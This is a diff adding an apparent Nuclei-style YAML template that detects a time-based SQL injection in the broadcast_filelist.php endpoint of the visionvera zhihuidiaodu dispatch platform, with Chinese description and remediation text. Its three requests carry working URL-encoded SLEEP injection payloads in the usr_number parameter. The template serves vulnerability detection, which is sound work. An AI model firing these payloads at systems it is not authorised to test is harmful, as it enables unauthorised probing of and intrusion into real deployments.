@@ -1,0 +1,59 @@
+id: visionvera-zhihuidiaodu-broadcast-filelist-sqli
+
+info:
+  name: visionvera zhihuidiaodu broadcast_filelist.php 注入
+  author: bl
+  severity: high
+  tags: 指挥调度管理平台
+  description: |-
+    本模板用于检测 visionvera zhihuidiaodu 组件中 broadcast_filelist.php 接口存在的SQL注入漏洞。攻击者可向受影响端点提交恶意构造的输入，干扰后端数据库查询逻辑，可能导致未授权访问、敏感数据泄露或数据篡改。实际危害取决于目标版本、部署配置及接口暴露情况。
+  remediation: >-
+    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。
+  
+variables:
+  sleepSecond1: '{{rand_int(6, 7)}}'
+  sleepSecond2: '{{rand_int(2, 3)}}'
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/client/broadcast_filelist.php?usr_number=1%27%20AND%20(SELECT%204066%20FROM%20(SELECT(SLEEP(0)))ZDkU)--%20hTlq'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: regex
+        regex:
+          - "^\\[\\]$"
+        part: body
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/client/broadcast_filelist.php?usr_number=1%27%20AND%20(SELECT%204066%20FROM%20(SELECT(SLEEP({{sleepSecond1}})))ZDkU)--%20hTlq'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: dsl
+        dsl:
+          - duration - duration_1 >= sleepSecond1 * 1 - 1
+        condition: and
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/client/broadcast_filelist.php?usr_number=1%27%20AND%20(SELECT%204066%20FROM%20(SELECT(SLEEP({{sleepSecond2}})))ZDkU)--%20hTlq'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration - duration_1 >= sleepSecond2 * 1 - 1
+        condition: and
